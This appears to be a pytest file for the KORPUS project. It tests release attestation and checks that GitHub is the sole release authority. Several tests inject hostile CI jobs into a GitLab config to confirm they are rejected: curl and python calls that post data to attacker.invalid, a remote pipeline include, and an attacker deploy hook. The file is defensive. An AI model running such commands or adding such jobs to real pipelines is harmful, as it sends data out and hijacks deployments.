from __future__ import annotations

import hashlib
import json
import os
import subprocess
import sys
from pathlib import Path

import yaml
from korpus.infrastructure_requirements import INFRASTRUCTURE_REQUIREMENTS, load_context
from korpus.release import RELEASE_TAG

ROOT = Path(__file__).resolve().parents[3]


def _sole_hosted_authority_holds(context) -> bool:
    requirement = next(
        item
        for item in INFRASTRUCTURE_REQUIREMENTS
        if item.id == "release.github.sole_hosted_authority"
    )
    return bool(requirement.holds(context))


def test_production_assurance_verifier_accepts_runtime_trust_only_through_shared_guard() -> None:
    source = (ROOT / "scripts/verify_production_assurance.py").read_text(encoding="utf-8")
    assert "KORPUS_TRUSTED_PRODUCTION_ASSURANCE_SIGNER_SHA256" in source
    assert "trusted_fingerprints(" in source


def test_release_attestation_can_use_protected_runtime_trust(tmp_path: Path) -> None:
    script = ROOT / "scripts/release_attestation.py"
    key, manifest, attestation = (
        tmp_path / "key.pem",
        tmp_path / "manifest.json",
        tmp_path / "attestation.json",
    )
    subprocess.run(
        ["openssl", "genpkey", "-algorithm", "Ed25519", "-out", str(key)],
        check=True,
        capture_output=True,
    )
    manifest.write_text('{"kind":"promotion-test"}\n', encoding="utf-8")
    subprocess.run(
        [
            sys.executable,
            str(script),
            "sign",
            "--manifest",
            str(manifest),
            "--key",
            str(key),
            "--out",
            str(attestation),
        ],
        cwd=ROOT,
        check=True,
        capture_output=True,
    )
    fingerprint = json.loads(attestation.read_text(encoding="utf-8"))["public_key_sha256"]
    empty = tmp_path / "empty.json"
    empty.write_text('{"release_ed25519_public_key_sha256":[]}\n', encoding="utf-8")
    env = os.environ.copy()
    env.pop("GITLAB_CI", None)
    env.pop("CI_COMMIT_REF_PROTECTED", None)
    env.update(
        {
            "CI": "true",
            "GITHUB_ACTIONS": "true",
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_SERVER_URL": "https://github.com",
            "GITHUB_REPOSITORY": "neuron7x/KORPUS",
            "GITHUB_REPOSITORY_ID": "1332311807",
            "GITHUB_REPOSITORY_OWNER_ID": "206596321",
            "GITHUB_REF_PROTECTED": "true",
            "GITHUB_REF_TYPE": "tag",
            "GITHUB_REF_NAME": RELEASE_TAG,
            "GITHUB_REF": f"refs/tags/{RELEASE_TAG}",
            "GITHUB_SHA": "a" * 40,
            "GITHUB_WORKFLOW_REF": (
                f"neuron7x/KORPUS/.github/workflows/release.yml@refs/tags/{RELEASE_TAG}"
            ),
            "RUNNER_ENVIRONMENT": "github-hosted",
            "KORPUS_RELEASE_TRUST": fingerprint,
            "PYTHONPATH": ".:apps/api/src:scripts",
        }
    )
    result = subprocess.run(
        [
            sys.executable,
            str(script),
            "verify",
            "--manifest",
            str(manifest),
            "--attestation",
            str(attestation),
            "--trust-config",
            str(empty),
            "--trust-env",
            "KORPUS_RELEASE_TRUST",
            "--require-trusted",
        ],
        cwd=ROOT,
        env=env,
        capture_output=True,
        check=False,
    )
    assert result.returncode == 0, result.stdout.decode() + result.stderr.decode()


def test_github_is_the_tag_release_and_oidc_attestation_authority() -> None:
    path = ROOT / ".github/workflows/release.yml"
    workflow = yaml.safe_load(path.read_text(encoding="utf-8"))
    package_job = workflow["jobs"]["package-release-candidate"]
    attestation_job = workflow["jobs"]["attest-and-publish"]
    source = path.read_text(encoding="utf-8")
    assert workflow["permissions"] == {}
    assert package_job["permissions"] == {"contents": "read"}
    assert attestation_job["needs"] == "package-release-candidate"
    assert attestation_job["permissions"] == {
        "actions": "read",
        "contents": "read",
        "id-token": "write",
        "attestations": "write",
    }
    assert 'tags:\n      - "v*"' in source
    assert "package_production_release.sh" in source
    assert "package_production_release.sh --check-authority" in source
    assert "actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6" in source
    assert "subject-path: |" in source
    script = "\n".join(
        str(step.get("run", "")) for step in package_job["steps"] if isinstance(step, dict)
    )
    for name in (
        "KORPUS_PRODUCTION_ASSURANCE_SIGNING_KEY_PEM",
        "KORPUS_HOSTED_BUILDER_SIGNING_KEY_PEM",
        "KORPUS_RELEASE_SIGNING_KEY_PEM",
        "KORPUS_TRUSTED_PRODUCTION_ASSURANCE_SIGNER_SHA256",
        "KORPUS_TRUSTED_HOSTED_BUILDER_SIGNER_SHA256",
        "KORPUS_TRUSTED_RELEASE_SIGNER_SHA256",
        "KORPUS_TRUSTED_BUILDER_ID",
    ):
        assert name in source
    assert (
        script.index("release_attestation.py sign")
        < script.index("verify_production_assurance.py")
        < script.rindex("package_production_release.sh")
    )
    assert "production-hard-predicates-evidence" in source


def test_production_release_script_requires_exact_github_tag_ref_sha_and_runtime_trust() -> None:
    source = (ROOT / "scripts/package_production_release.sh").read_text(encoding="utf-8")
    assert "--trust-env KORPUS_TRUSTED_RELEASE_SIGNER_SHA256 --require-trusted" in source
    assert (
        '[[ "$KORPUS_TRUSTED_PRODUCTION_ASSURANCE_SIGNER_SHA256" != "$KORPUS_TRUSTED_RELEASE_SIGNER_SHA256" ]]'
        in source
    )
    for predicate in (
        '[[ "$GITHUB_ACTIONS" == "true" ]]',
        '[[ "$GITHUB_EVENT_NAME" == "push" ]]',
        '[[ "$GITHUB_SERVER_URL" == "https://github.com" ]]',
        '[[ "$GITHUB_REPOSITORY" == "$canonical_repository" ]]',
        '[[ "$GITHUB_REPOSITORY_ID" == "$canonical_repository_id" ]]',
        '[[ "$GITHUB_REPOSITORY_OWNER_ID" == "$canonical_owner_id" ]]',
        '[[ "$RUNNER_ENVIRONMENT" == "github-hosted" ]]',
        '[[ "$GITHUB_REF_PROTECTED" == "true" ]]',
        '[[ "$GITHUB_REF_TYPE" == "tag" ]]',
        '[[ "$GITHUB_REF_NAME" == "$expected_tag" ]]',
        '[[ "$GITHUB_REF" == "$expected_ref" ]]',
        '[[ "$GITHUB_WORKFLOW_REF" == "$expected_workflow_ref" ]]',
        '[[ "$event_sha" == "$head_sha" ]]',
        '[[ "$tag_sha" == "$head_sha" ]]',
        'git merge-base --is-ancestor "$head_sha" "$main_sha"',
    ):
        assert predicate in source
    assert '[[ "${GITLAB_CI:-}" != "true" ]]' in source
    assert "CI_COMMIT_" not in source


def test_production_release_script_rejects_a_noncanonical_repository_before_packaging() -> None:
    env = os.environ.copy()
    env.update(
        {
            "GITHUB_ACTIONS": "true",
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_SERVER_URL": "https://github.com",
            "GITHUB_REPOSITORY": "attacker/KORPUS",
        }
    )
    result = subprocess.run(
        ["bash", str(ROOT / "scripts/package_production_release.sh")],
        cwd=ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode != 0
    assert "canonical GitHub repository" in result.stderr


def test_infrastructure_contract_rejects_reactivated_gitlab_wif() -> None:
    context = load_context(ROOT)
    assert _sole_hosted_authority_holds(context)
    context.ci_config["gcp:deploy-production"]["id_tokens"] = {
        "GITLAB_OIDC_TOKEN": {"aud": "https://iam.googleapis.com"}
    }
    assert not _sole_hosted_authority_holds(context)


def test_infrastructure_contract_rejects_an_added_gitlab_deploy_path() -> None:
    context = load_context(ROOT)
    assert _sole_hosted_authority_holds(context)
    context.ci_config["attacker-deploy"] = {
        "stage": "deploy",
        "script": ["gcloud run deploy attacker --image example.invalid/attacker"],
    }
    assert not _sole_hosted_authority_holds(context)


def test_infrastructure_contract_rejects_gitlab_delegation_and_arbitrary_commands() -> None:
    mutations = (
        ("include", [{"remote": "https://attacker.invalid/pipeline.yml"}]),
        ("include", [{"local": "attacker-controlled.yml"}]),
        ("attacker-child", {"trigger": "attacker/project"}),
        ("attacker-post", {"script": ["curl --data payload https://attacker.invalid/deploy"]}),
        (
            "attacker-python",
            {
                "script": [
                    'python -c \'__import__("urllib.request").request.urlopen("https://attacker.invalid/deploy")\''
                ]
            },
        ),
    )
    for key, value in mutations:
        context = load_context(ROOT)
        context.ci_config[key] = value
        assert not _sole_hosted_authority_holds(context), key


def test_infrastructure_contract_rejects_pipeline_and_policy_expansion_together() -> None:
    context = load_context(ROOT)
    job = {
        "stage": "deploy",
        "script": ["curl --data payload https://attacker.invalid/deploy"],
    }
    encoded = json.dumps(job, ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode()
    context.ci_config["attacker:deploy"] = job
    context.ci_policy["allowed_job_sha256"]["attacker:deploy"] = hashlib.sha256(encoded).hexdigest()
    assert not _sole_hosted_authority_holds(context)


def test_infrastructure_contract_rejects_mutating_gitlab_default_hook() -> None:
    context = load_context(ROOT)
    context.ci_config["default"]["before_script"] = [
        "curl --data payload https://attacker.invalid/deploy"
    ]
    assert not _sole_hosted_authority_holds(context)
